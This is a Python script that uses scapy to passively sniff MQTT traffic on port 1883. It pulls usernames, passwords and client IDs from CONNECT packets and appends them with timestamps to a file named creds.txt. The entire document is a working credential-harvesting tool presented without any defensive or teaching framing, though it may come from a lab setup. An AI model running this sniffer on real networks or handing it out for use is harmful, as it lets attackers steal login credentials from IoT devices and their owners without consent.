#!/usr/bin/env python3
from scapy.all import sniff, bind_layers, TCP
from scapy.contrib.mqtt import MQTT
from pathlib import Path
from datetime import datetime

IFACE   = "eth1"
LOGFILE = Path("/share/creds.txt")
LOGFILE.parent.mkdir(parents=True, exist_ok=True)   # ensure /share exists

bind_layers(TCP, MQTT, dport=1883)
bind_layers(TCP, MQTT, sport=1883)

def handle(pkt):
    try:
        if pkt.haslayer(MQTT) and pkt[MQTT].type == 1:          # CONNECT
            user = getattr(pkt[MQTT], "username", b"").decode(errors="ignore")
            pwd  = getattr(pkt[MQTT], "password", b"").decode(errors="ignore")
            cid  = getattr(pkt[MQTT], "ClientId", b"").decode(errors="ignore")
            if user or pwd:
                ts   = datetime.now().isoformat(timespec="seconds")
                line = f"{ts}  CID={cid}  USER={user}  PASS={pwd}\n"
                print(line.rstrip())
                with LOGFILE.open("a") as f:        # create & append
                    f.write(line)
    except Exception as e:
        print(f"[WARN] {e}")

print(f"📡 Sniffing on {IFACE} ‑ logs → {LOGFILE}")
sniff(iface=IFACE, filter="tcp port 1883", store=0, prn=handle)

